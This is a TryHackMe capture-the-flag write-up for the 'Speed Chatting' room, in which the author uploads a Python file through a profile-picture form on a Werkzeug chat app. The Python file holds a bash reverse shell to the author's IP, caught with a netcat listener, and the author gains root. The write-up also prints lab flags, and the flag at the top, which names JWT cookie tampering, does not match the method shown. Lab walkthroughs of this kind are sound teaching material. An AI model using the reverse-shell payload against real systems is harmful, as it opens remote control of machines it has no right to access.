# <div align="center">[Speed Chatting - TryHackMe Write-up](https://tryhackme.com/room/lafb2026e4)</div>
<div align="center">Can you hack as fast as you can chat?</div>
<br>
<div align="center">
  <img width="200" height="200" alt="Speed-Chatting" src="https://github.com/user-attachments/assets/6046f144-cdce-4ae6-bd3e-fb725460cc77" />
</div>

## Task 1. Speed Chat
### What is the flag?
```
THM{v4l3nt1n3_jwt_c00k13_t4mp3r_4dm1n_sh0p}
```

Accessing the Website
The objective of this room is 

As soon as I started the lab, most of the initial enumeration was already handled.

<img width="1016" height="800" alt="image" src="https://github.com/user-attachments/assets/31947002-a313-4431-ba73-4f61c18f6b34" />

The target application is running on port 5000, so I navigated directly to the web interface.

Navigating to webpage

<img width="1348" height="765" alt="image" src="https://github.com/user-attachments/assets/2fb27bdb-3b30-432f-9a4a-2ecc16c99e80" />

There is profile pic uploading section we can intract with this 

<img width="1295" height="755" alt="image" src="https://github.com/user-attachments/assets/ddddbdef-9b5c-4bba-b376-9d225b43bff0" />

as we can see the msg is carried by api 

<img width="1352" height="881" alt="image" src="https://github.com/user-attachments/assets/c5d64094-3f4a-4c96-8f16-47fce9754169" />

As i check for the response i got to know the server is using `Server: Werkzeug/3.1.5 Python/3.10.12` 

<img width="1427" height="412" alt="image" src="https://github.com/user-attachments/assets/42e48eff-508c-403d-a827-112c598ef6ad" />

## Exploitation

Let craft a basic python reverse shell
```
cat << 'EOF' > test.py
import os
os.system("bash -c 'bash -i >& /dev/tcp/192.168.138.190/1234 0>&1'")
EOF
```
In new tab open netcat listner 
```
nc -lnvp 1234
```
As i uploaded i got the shell

<img width="812" height="160" alt="image" src="https://github.com/user-attachments/assets/9b3112dc-48ea-4fb5-8163-05e1759917c0" />


## flag
We are root in this machine let find flag

<img width="755" height="195" alt="image" src="https://github.com/user-attachments/assets/3bfefb15-29ee-49e1-b919-3a3c8f9281a0" />

```
THM{R3v3rs3_Sh3ll_L0v3_C0nn3ct10ns}root@tryhackme-2204:/opt/Speed_Chat# 
```
